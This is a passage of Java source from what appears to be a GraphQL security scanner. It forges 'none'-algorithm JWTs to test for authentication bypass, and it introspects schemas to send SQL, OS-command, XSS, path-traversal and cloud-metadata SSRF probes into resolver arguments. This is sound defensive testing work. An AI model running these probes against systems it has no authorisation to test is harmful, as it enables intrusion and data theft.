     * signature — the same "none" algorithm forgery {@code BrokenAuthenticationTestCase} uses for
     * the header-based variant, applied here as a query argument instead.
     */
    List<Finding> testArgumentBasedAuthBypass(EndpointInfo endpoint, HttpClient httpClient) {
        List<Finding> findings = new ArrayList<>();
        try {
            HttpResponse baseline = httpClient.postWithStatus(endpoint.getFullUrl(), Map.of(), CONTENT_TYPE_JSON,
                    "{\"query\":\"{__typename}\"}");
            if (!isAcceptedGraphQLQuery(baseline)) {
                return findings; // can't even do introspection-free queries — skip
            }

            for (String fieldName : CURRENT_USER_FIELD_NAMES) {
                String query = String.format(
                        "{\"query\":\"{%s(token:\\\"%s\\\"){__typename}}\"}", fieldName, NONE_ALG_JWT_ARG);
                HttpResponse response = httpClient.postWithStatus(
                        endpoint.getFullUrl(), Map.of(), CONTENT_TYPE_JSON, query);

                if (isAcceptedGraphQLQuery(response)) {
                    Finding f = new Finding(
                            UUID.randomUUID().toString(),
                            "GraphQL Argument-Based Authentication Bypass",
                            String.format("The query field '%s' accepted a 'token' argument containing a " +
                                    "JWT signed with the 'none' algorithm and returned a successful response, " +
                                    "indicating the token argument is trusted without signature validation.",
                                    fieldName),
                            Severity.CRITICAL,
                            getId(),
                            "POST " + endpoint.getPath() + " (query " + fieldName + ")",
                            "Never accept authentication tokens as query arguments — use the Authorization " +
                            "header exclusively, and always validate JWT signatures against a known algorithm " +
                            "and key before trusting any claim in the token."
                    );
                    f.setEvidence("query{" + fieldName + "(token: <none-alg JWT>){__typename}} returned HTTP " +
                            response.getStatusCode());
                    findings.add(f);
                    return findings; // one confirmed instance is enough
                }
            }
        } catch (Exception e) {
            logger.debug("Error testing GraphQL argument-based auth bypass on {}: {}", endpoint, e.getMessage());
        }
        return findings;
    }

    // ── Test 5: Resolver-level injection ─────────────────────────────────────

    /**
     * Introspects mutation fields and their arguments, then sends injection payloads (OS command,
     * SQL, XSS, path traversal) as the value of each string-typed argument found — targeting
     * resolver-level flaws (like DVGA's OS-command/SQL-injection/stored-XSS scenarios) that the
     * schema/protocol-level checks above don't cover.
     * <p>
     * Requires introspection to be enabled (or already known to be, from
     * {@link #testIntrospectionEnabled}) — without the schema, there's no way to know which
     * mutations exist or what arguments they accept without guessing field names, which fails
     * schema validation before ever reaching the resolver (the same class of bug fixed for the
     * query-depth probe). Limited to the first 5 discovered mutations to bound request volume.
     * <p>
     * Two real-world complications this handles, found by testing against DVGA rather than just
     * unit tests: (1) many resolvers require values for arguments the schema marks as nullable —
     * so this fills every argument with a type-appropriate default, injecting the payload only
     * into the target string argument, rather than omitting the others; (2) many mutations wrap
     * their result in a payload/result type (Relay-style — e.g. {@code CreatePaste { paste {
     * content } } }) rather than returning the affected data directly, so a bare {@code
     * {__typename}} selection would never surface the reflected payload — this resolves the
     * mutation's own return type's fields (recursing one level into a single nested object field)
     * to build a selection that actually echoes the data back.
     */
    List<Finding> testResolverInjection(EndpointInfo endpoint, HttpClient httpClient) {
        List<Finding> findings = new ArrayList<>();
        // Resolver-level injection isn't unique to mutations — a query field with a string
        // argument (e.g. DVGA's pastes(filter)) is just as exploitable, and testing only
        // mutations (the original scope) missed that whole surface.
        findings.addAll(testFieldInjection(endpoint, httpClient, MUTATION_INTROSPECTION_QUERY, "mutationType", "mutation"));
        findings.addAll(testFieldInjection(endpoint, httpClient, QUERY_INTROSPECTION_QUERY, "queryType", "query"));
        return findings;
    }

    /**
     * Shared implementation behind {@link #testResolverInjection}, parameterized over whether
     * it's testing {@code mutationType} or {@code queryType} fields.
     * <p>
     * Tests every discovered candidate field (bounded to 5, see {@link #extractStringArgFields}),
     * not just the first one that yields a finding — a mutation being vulnerable doesn't mean
     * every other mutation is safe, and stopping at the first confirmed hit (the original
     * behavior) silently skipped every other candidate in the same scan.
     */
    private List<Finding> testFieldInjection(EndpointInfo endpoint, HttpClient httpClient,
                                              String introspectionQuery, String schemaFieldName,
                                              String operationKeyword) {
        List<Finding> findings = new ArrayList<>();

        List<MutationCandidate> candidates;
        try {
            HttpResponse introspectionResponse = httpClient.postWithStatus(
                    endpoint.getFullUrl(), Map.of(), CONTENT_TYPE_JSON, introspectionQuery);

            if (!isAcceptedGraphQLQuery(introspectionResponse)) {
                logger.debug("Skipping {} injection test — {} introspection unavailable on {}",
                        operationKeyword, schemaFieldName, endpoint);
                return findings;
            }
            candidates = extractStringArgFields(introspectionResponse.getBody(), schemaFieldName);
        } catch (Exception e) {
            logger.debug("Error introspecting {} on {}: {}", schemaFieldName, endpoint, e.getMessage());
            return findings;
        }

        for (MutationCandidate candidate : candidates) {
            String selectionSet = resolveSelectionSet(candidate.returnTypeName(), endpoint, httpClient, 0);
            boolean isSsrfLikeArg = SSRF_LIKE_ARG_NAMES.stream()
                    .anyMatch(name -> candidate.targetArgName().toLowerCase().contains(name));

            List<String> payloadsToTry = new ArrayList<>(RESOLVER_INJECTION_PAYLOADS);
            if (isSsrfLikeArg) {
                payloadsToTry.addAll(GRAPHQL_SSRF_PAYLOADS);
            }

            boolean confirmedForThisCandidate = false;
            for (String payload : payloadsToTry) {
                try {
                    String escapedPayload = payload.replace("\\", "\\\\").replace("\"", "\\\"");
                    String argList = buildArgumentList(candidate, escapedPayload);
                    String fieldCall = String.format("%s{%s(%s)%s}",
                            operationKeyword, candidate.name(), argList, selectionSet);
                    String requestBody = "{\"query\":\"" + fieldCall + "\"}";

                    HttpResponse response = httpClient.postWithStatus(
                            endpoint.getFullUrl(), Map.of(), CONTENT_TYPE_JSON, requestBody);
                    String body = response != null ? response.getBody() : null;

                    if (response != null && response.isSuccess() && body != null) {
                        String lowerBody = body.toLowerCase();
                        boolean isSsrfPayload = GRAPHQL_SSRF_PAYLOADS.contains(payload);
                        List<String> indicatorsToCheck = isSsrfPayload
                                ? GRAPHQL_SSRF_INDICATORS : RESOLVER_INJECTION_INDICATORS;

                        for (String indicator : indicatorsToCheck) {
                            if (lowerBody.contains(indicator.toLowerCase())) {
                                findings.add(buildResolverInjectionFinding(endpoint, candidate, operationKeyword,
                                        payload, indicator, isSsrfPayload));
                                confirmedForThisCandidate = true;
                                break;
                            }
                        }
                    }
                } catch (Exception e) {
                    logger.debug("Error testing {} injection on {}.{}: {}",
                            operationKeyword, candidate.name(), candidate.targetArgName(), e.getMessage());
                }

                // One confirmed finding for THIS field is enough — but unlike the original
                // behavior, this only stops trying payloads against the current candidate; the
                // outer loop still moves on to test every other candidate field.
                if (confirmedForThisCandidate) {
                    break;
                }
            }
        }

        return findings;
    }

    private Finding buildResolverInjectionFinding(EndpointInfo endpoint, MutationCandidate candidate,
                                                   String operationKeyword, String payload, String indicator,
                                                   boolean isSsrf) {
        Finding f = new Finding(
                UUID.randomUUID().toString(),
                isSsrf ? "GraphQL Resolver SSRF Vulnerability" : "GraphQL Resolver Injection Vulnerability",
                isSsrf
                        ? String.format("The %s '%s' appears to pass its '%s' argument to a server-side " +
                                "HTTP request without validating the destination — a cloud metadata endpoint " +
                                "URL placed in this argument was fetched and its response reflected back, " +
                                "based on the detected pattern '%s'.",
                                operationKeyword, candidate.name(), candidate.targetArgName(), indicator)
                        : String.format("The %s '%s' appears to pass its '%s' argument unsanitized into a " +
                                "resolver that executes it (SQL query, shell command, or renders it " +
                                "unescaped), based on the detected pattern '%s' in the response.",
                                operationKeyword, candidate.name(), candidate.targetArgName(), indicator),
                Severity.CRITICAL,
                getId(),
                "POST " + endpoint.getPath() + " (" + operationKeyword + " " + candidate.name() + ")",
                isSsrf
                        ? "Validate and allowlist destination hosts before making any server-side request " +
                          "built from user input. Block requests to link-local/metadata IP ranges (e.g. " +
                          "169.254.169.254) at the network layer as defense in depth."
                        : "Never build SQL queries or shell commands by concatenating resolver arguments. " +
                          "Use parameterized queries for database access, avoid shelling out entirely where " +
                          "possible, and escape/validate all resolver input before use, output, or persistence."
        );
        f.setEvidence("Payload: " + payload + "\nPattern found: " + indicator);
        f.setRequestDetails("mutation/query field: " + candidate.name());
        return f;
    }

    private record ArgSpec(String name, String typeName) { }

    private record MutationCandidate(String name, String targetArgName, List<ArgSpec> allArgs,
                                      String returnTypeName) { }

    /**
     * Parses a mutationType/queryType introspection response and returns, for each field with at
     * least one String-typed argument, its name, its first String argument (the injection
     * target), every argument the field accepts (so all of them can be given a valid default —
     * see {@link #testFieldInjection}), and its own resolved return type name. Bounded to the
     * first 5 fields found, to keep request volume reasonable.
     */
    List<MutationCandidate> extractStringArgFields(String introspectionBody, String schemaFieldName) {
        List<MutationCandidate> results = new ArrayList<>();
        try {
            JsonNode root = objectMapper.readTree(introspectionBody);
            JsonNode fields = root.path("data").path("__schema").path(schemaFieldName).path("fields");
            if (!fields.isArray()) {
                return results;
            }
            for (JsonNode field : fields) {
                if (results.size() >= 5) break;
                String mutationName = field.path("name").asText(null);
                if (mutationName == null) continue;

                String targetArgName = null;
                List<ArgSpec> allArgs = new ArrayList<>();
                for (JsonNode arg : field.path("args")) {
                    String argName = arg.path("name").asText(null);
                    if (argName == null) continue;
                    String argType = resolveScalarTypeName(arg.path("type"));
                    allArgs.add(new ArgSpec(argName, argType));
                    if (targetArgName == null && "String".equals(argType)) {
                        targetArgName = argName;
                    }
                }

                if (targetArgName != null) {
                    String returnTypeName = resolveScalarTypeName(field.path("type"));
                    results.add(new MutationCandidate(mutationName, targetArgName, allArgs, returnTypeName));
                }
            }
        } catch (Exception e) {
            logger.debug("Error parsing mutation introspection response: {}", e.getMessage());
        }
        return results;
    }

    /**
     * Builds the full GraphQL argument list for a mutation call: the target argument gets the
     * (already-escaped) injection payload, every other argument gets a type-appropriate benign
     * default so resolvers that require values beyond what the schema's nullability suggests
     * (a real-world mismatch found via DVGA) still accept the call. Arguments whose type couldn't
     * be resolved to a known scalar are omitted — if the resolver truly requires them, the call
     * will fail and this mutation simply won't yield a finding, rather than guessing wrong.
     */
    private String buildArgumentList(MutationCandidate candidate, String escapedPayload) {
        List<String> parts = new ArrayList<>();
        for (ArgSpec arg : candidate.allArgs()) {
            if (arg.name().equals(candidate.targetArgName())) {
                parts.add(arg.name() + ":\\\"" + escapedPayload + "\\\"");
            } else {
                String defaultValue = defaultValueFor(arg.typeName());
                if (defaultValue != null) {
                    parts.add(arg.name() + ":" + defaultValue);
                }
            }
        }
        return String.join(",", parts);
    }

    private String defaultValueFor(String typeName) {
        if (typeName == null) return null;
        return switch (typeName) {
            case "String", "ID" -> "\\\"test\\\"";
            case "Int", "Float" -> "1";
            case "Boolean" -> "true";
            default -> null; // unresolvable/complex type (enum, input object, list, ...) — omit
        };
    }

    /**
     * Resolves a GraphQL selection set for the given return type name, so a mutation's reflected
     * data actually surfaces in the response instead of only proving the call succeeded.
     * <ul>
     *   <li>Unknown/null type name (introspection couldn't resolve it) → falls back to
     *       {@code {__typename}}, which is always valid but won't show reflected data.</li>
     *   <li>A scalar type (String, Int, ...) → the mutation returns the value directly, no
     *       selection needed at all.</li>
     *   <li>An object type → introspects that type's own fields; scalar fields are selected
     *       directly, and (bounded to one additional level, to avoid unbounded recursion / request
     *       volume) a single nested object field is recursed into — covering the common
     *       Relay-style "MutationPayload {@code ->} affectedObject {@code ->} its fields" shape.</li>
     * </ul>
     */
    private String resolveSelectionSet(String returnTypeName, EndpointInfo endpoint, HttpClient httpClient, int depth) {
        if (returnTypeName == null || KNOWN_SCALAR_TYPES.contains(returnTypeName)) {
            return "";
        }
        if (depth > 1) {
            return "{__typename}";
        }

        try {
            String query = String.format(TYPE_FIELDS_QUERY_TEMPLATE, returnTypeName);
            HttpResponse response = httpClient.postWithStatus(
                    endpoint.getFullUrl(), Map.of(), CONTENT_TYPE_JSON, query);
            if (!isAcceptedGraphQLQuery(response)) {
                return "{__typename}";
            }

            JsonNode root = objectMapper.readTree(response.getBody());
            JsonNode fields = root.path("data").path("__type").path("fields");
            if (!fields.isArray() || fields.isEmpty()) {
                return "{__typename}";
            }

            List<String> scalarFieldNames = new ArrayList<>();
            String nestedObjectSelection = null;
            for (JsonNode field : fields) {
                String fieldName = field.path("name").asText(null);
                if (fieldName == null) continue;
                String fieldType = resolveScalarTypeName(field.path("type"));

                if (KNOWN_SCALAR_TYPES.contains(fieldType)) {
                    scalarFieldNames.add(fieldName);
                } else if (nestedObjectSelection == null && fieldType != null) {
                    // Recurse one level into the first nested object field only, to keep this
                    // bounded — e.g. CreatePaste.paste -> PasteObject's scalar fields.
                    String nested = resolveSelectionSet(fieldType, endpoint, httpClient, depth + 1);
                    if (!nested.isEmpty()) {
                        nestedObjectSelection = fieldName + nested;
                    }
                }
            }

            List<String> selections = new ArrayList<>(scalarFieldNames);
            if (nestedObjectSelection != null) {
                selections.add(nestedObjectSelection);
            }
            return selections.isEmpty() ? "{__typename}" : "{" + String.join(" ", selections) + "}";
        } catch (Exception e) {
            logger.debug("Error resolving selection set for type {}: {}", returnTypeName, e.getMessage());
            return "{__typename}";
        }
    }

    /**
     * Unwraps GraphQL's NON_NULL/LIST type-wrapper nodes (up to two levels) to find the
     * underlying named type, e.g. {@code String!} (NON_NULL wrapping String) resolves to
     * {@code "String"}.
     */
    private String resolveScalarTypeName(JsonNode typeNode) {
        JsonNode current = typeNode;
        for (int i = 0; i < 3 && current != null && !current.isMissingNode(); i++) {
            String name = current.path("name").asText(null);
            if (name != null) {
                return name;
            }
            current = current.path("ofType");
        }
        return null;
    }
}
